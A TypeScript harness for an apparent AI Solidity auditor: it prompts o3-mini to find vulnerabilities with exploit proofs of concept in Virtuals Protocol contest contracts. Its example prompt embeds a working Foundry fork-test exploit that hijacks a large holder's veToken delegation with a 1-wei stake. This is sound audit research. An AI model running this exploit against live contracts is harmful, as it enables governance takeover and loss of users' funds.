import 'dotenv/config';
import fs from 'fs';
import { Agent } from '@mastra/core/agent';
import { openai } from '@ai-sdk/openai';
import { z } from 'zod';
import { getProjects, isSolidityProject } from './utils';
import bench from './bench';

const auditAgent = new Agent({
  name: 'ai-auditor',
  instructions: `You are a helpful assistant that audits Solidity code.

The follwoings qualifies as vulnerabilities:
- A vulernability that could lead to a loss of funds.
A vulernability that could lead to a loss of data.
A vulernability that could lead to a loss of functionality.
A vulernability that could lead to a loss of availability.
A vulernability that could lead to funds being locked.

The followings are not considered vulnerabilities:
- Owner have permission to override contract state.
- Integer overflows/underflows when Solidity version is >0.8.0
- Lack of Input Validation for Address Field
- A vulernability that requires social engineering to exploit.

Do not include anything in your report that is based on assumptions.
Please provide a concrete reason why the vulnerability could lead to a loss of funds, data, or functionality.
  `,
  model: openai('o3-mini'),
});

const REPOS_PATH = '/Users/danieltehrani/dev/ai-auditor/repos';

const auditFile = async ({
  projectName,
  filePath,
}: {
  projectName: string;
  filePath: string;
}) => {
  const contractContent = fs.readFileSync(
    `${REPOS_PATH}/${projectName}/${filePath}`,
    'utf8'
  );

  const contractName = filePath.split('/').pop()?.replace('.sol', '');

  const AgentFactory = fs.readFileSync(
    '/Users/danieltehrani/dev/ai-auditor/packages/auditor/src/AgentFactory.sol',
    'utf8'
  );

  const ValidatorRegistry = fs.readFileSync(
    '/Users/danieltehrani/dev/ai-auditor/packages/auditor/src/ValidatorRegistry.sol',
    'utf8'
  );

  if (contractContent.includes('interface ')) {
    console.log('Skipping', contractName);
    return { findings: [] };
  }

  console.log('Auditing', filePath);

  const flattenedFile = fs.readFileSync(
    `${REPOS_PATH}/${projectName}/flattened/${contractName}.flattened.sol`,
    'utf8'
  );

  const response = await auditAgent.generate(
    `
    Find vulnerabilities in the following contract.
    You must include a proof of concept of how to exploit the vulnerability.
    The proof of concept should result in a loss of funds or denial of service.
    It shouldn't be a theoretical vulnerability.

    Contract name: ${contractName}

    Contract content:
    ${contractContent}

    The related contracts:
    ${AgentFactory}
    ${ValidatorRegistry}
    `,
    {
      output: z.object({
        findings: z.array(
          z.object({
            title: z.string(),
            severity: z.enum(['High', 'Medium', 'Low']),
            description: z.string(),
            proofOfConcept: z.string(),
          })
        ),
      }),
    }
  );

  return { findings: response.object.findings, usage: response.usage };
};

const auditProject = async ({
  projectName,
  findingsDir,
}: {
  projectName: string;
  findingsDir: string;
}) => {
  console.log(`Auditing ${projectName}`);

  const scope = fs.readFileSync(
    `${REPOS_PATH}/${projectName}/scope.txt`,
    'utf8'
  );
  const filesInScope = scope.split('\n').filter(item => item.includes('.sol'));

  const PROJECT_FINDINGS_PATH = `${findingsDir}/${projectName}`;
  fs.mkdirSync(PROJECT_FINDINGS_PATH, { recursive: true });

  const allFindings: {
    title: string;
    severity: string;
    description: string;
    contractName: string;
  }[] = [];

  let promptTokens = 0;
  let completionTokens = 0;

  for (const filePath of filesInScope.slice(0, 1)) {
    try {
      const contractName = filePath.split('/').pop()?.replace('.sol', '');
      const contractFindings = await auditFile({ projectName, filePath });

      allFindings.push(
        ...contractFindings.findings.map(finding => ({
          ...finding,
          contractName: contractName ?? '',
        }))
      );

      promptTokens += contractFindings.usage?.promptTokens ?? 0;
      completionTokens += contractFindings.usage?.completionTokens ?? 0;
    } catch (error) {
      console.error(`Error auditing ${filePath}: ${error}`);
    }
  }

  fs.writeFileSync(
    `${PROJECT_FINDINGS_PATH}/findings.json`,
    JSON.stringify(allFindings, null, 2)
  );

  console.log(
    `Tokens used for ${projectName}: ${promptTokens} -> ${completionTokens}`
  );
  return { promptTokens, completionTokens };
};

const auditProjects = async () => {
  const projects = getProjects();

  const findingsDir = './src/findings/' + new Date().toISOString();
  fs.mkdirSync(findingsDir, { recursive: true });

  let totalPromptTokens = 0;
  let totalCompletionTokens = 0;
  for (const project of projects.slice(0, 2)) {
    try {
      const tokens = await auditProject({
        projectName: project,
        findingsDir,
      });
      totalPromptTokens += tokens.promptTokens;
      totalCompletionTokens += tokens.completionTokens;
    } catch (error) {
      console.error(`Error auditing ${project}: ${error}`);
    }
  }

  console.log(`Total tokens: ${totalPromptTokens} -> ${totalCompletionTokens}`);
  return findingsDir;
};

const auditAndBench = async () => {
  const findingsDir = await auditProjects();

  console.log('Evaluating...');
  await bench(findingsDir);
};

const test = async ({
  projectName,
  filePath,
}: {
  projectName: string;
  filePath: string;
}) => {
  const contractContent = fs.readFileSync(
    `${REPOS_PATH}/${projectName}/${filePath}`,
    'utf8'
  );

  const contractName = filePath.split('/').pop()?.replace('.sol', '');

  const AgentFactory = fs.readFileSync(
    '/Users/danieltehrani/dev/ai-auditor/packages/auditor/src/AgentFactory.sol',
    'utf8'
  );

  const ValidatorRegistry = fs.readFileSync(
    '/Users/danieltehrani/dev/ai-auditor/packages/auditor/src/ValidatorRegistry.sol',
    'utf8'
  );

  const AgentRewardV2 = fs.readFileSync(
    '/Users/danieltehrani/dev/ai-auditor/packages/auditor/src/AgentRewardV2.sol',
    'utf8'
  );

  if (contractContent.includes('interface ')) {
    console.log('Skipping', contractName);
    return { findings: [] };
  }

  console.log('Auditing', filePath);

  const flattenedFile = fs.readFileSync(
    `${REPOS_PATH}/${projectName}/flattened/${contractName}.flattened.sol`,
    'utf8'
  );

  const example = `
AgentVeToken.stake() function will automatically update the delegatee for the receiver. A malicious user can stake 1 wei of the LP token, set the receiver to be a user with an high balance of the veTokens, and set themselves as the delegatee.

Since these are the tokens that are used as voting power in the AgentDAO, a malicious user can donate 1 wei to multiple users with high balances, receive a majority voting power, then submit a malicious proposal.

## Proof of Concept

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;


import {Test, console} from "forge-std/Test.sol";


interface IERC20 {

    function transfer(address to, uint256 amount) external returns (bool);

    function mint(address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

}


interface IAgentToken is IERC20 {

    function distributeTaxTokens() external;


    function projectTaxPendingSwap() external view returns (uint256);


    function projectTaxRecipient() external view returns (address);


    function setProjectTaxRecipient(address projectTaxRecipient_) external; 


    function setSwapThresholdBasisPoints(uint16 swapThresholdBasisPoints_) external;


    function setProjectTaxRates(

        uint16 newProjectBuyTaxBasisPoints_,

        uint16 newProjectSellTaxBasisPoints_

    ) external;

}


interface IVeToken {

    function stake(uint256 amount, address receiver, address delegatee) external;


    function delegates(address account) external view returns (address);

}


interface IUniswapV2Router {

    function swapExactTokensForTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external returns (uint[] memory amounts);


    function addLiquidity(

        address tokenA,

        address tokenB,

        uint amountADesired,

        uint amountBDesired,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);

}


contract StakeDelegatePOC is Test {

    IAgentToken agentToken = IAgentToken(0x1C4CcA7C5DB003824208aDDA61Bd749e55F463a3);

    address agentPair = 0xD418dfE7670c21F682E041F34250c114DB5D7789;


    IERC20 virtualToken = IERC20(0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b);

    address bridge = 0x4200000000000000000000000000000000000010;

    IUniswapV2Router router = IUniswapV2Router(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24);


    string BASE_RPC_URL = vm.envString("BASE_RPC_URL");

    address user = makeAddr("user");

    uint256 virtualAmount = 2000 ether;


    function setUp() public {

        uint256 forkId = vm.createFork(BASE_RPC_URL, 29_225_700);

        vm.selectFork(forkId);


        // Set up the user with virtual tokens

        vm.prank(bridge);

        virtualToken.mint(user, virtualAmount);

    }


    function test_malicious_stake_delegate_poc() public {

        vm.startPrank(user);

        virtualToken.approve(address(router), type(uint256).max);

        agentToken.approve(address(router), type(uint256).max);


        // Swap half of the virtual tokens to agent tokens

        address[] memory path = new address[](2);

        path[0] = address(virtualToken);

        path[1] = address(agentToken);

        router.swapExactTokensForTokens(virtualAmount / 2, 0, path, user, block.timestamp);


        // Add liquidity to the pool to get LP tokens

        router.addLiquidity(

            address(virtualToken),

            address(agentToken),

            virtualAmount / 2,

            agentToken.balanceOf(user),

            1,

            1,

            user,

            block.timestamp

        );


        address gameDeployer = 0xD38493119859b8806ff28C32c41fdd67Ef41b8Ef; // Main holder of veTokens


        IVeToken veToken = IVeToken(0x974a21754271dD3d71a16F2852F8e226a9276b3E);

        assertNotEq(veToken.delegates(gameDeployer), user);


        // Stake 1 wei of LP for gameDeployer to update delegate

        IERC20(agentPair).approve(address(veToken), 1);

        veToken.stake(1, gameDeployer, user);

        assertEq(veToken.delegates(gameDeployer), user);

    }

}
  `;

  const response = await auditAgent.generate(
    `
    Find vulnerabilities in the following contract.
    You must include a proof of concept of how to exploit the vulnerability.
    The vulnerability should result in a loss of funds or denial of service.
    The proof of concept should be a concrete example of how the contract will be result in a loss of funds or denial of service.
    
    Here is an example of a description of a vulnerability and a proof of concept:
    <example>
    ${example}
    </example>

    Do NOT assume anything.
    - Do NOT assume that one state results in another

    Focus on the fact that the addValidator function is not restricted and anyone can call it.
    And focus on the fact that the "mint" function calls _addValidator.
    And also focus on the fact that _distributeValidatorRewards refers to the validators.
    Focus on if the calculation in the _distributeValidatorRewards function will be corrupted by the fact
    that the addValidator function is not restricted and anyone can call it.

    Contract name: ${contractName}

    Contract content:
    ${contractContent}

    The related contracts:
    ${AgentFactory}
    ${ValidatorRegistry}
    ${AgentRewardV2}

    
    `,
    {
      output: z.object({
        findings: z.array(
          z.object({
            title: z.string(),
            severity: z.enum(['High', 'Medium', 'Low']),
            description: z.string(),
            proofOfConcept: z.string(),
          })
        ),
      }),
    }
  );

  console.log(response.object.findings);
};

// auditAndBench();
test({
  projectName: '2025-04-virtuals-protocol',
  filePath: './contracts/virtualPersona/AgentNftV2.sol',
});
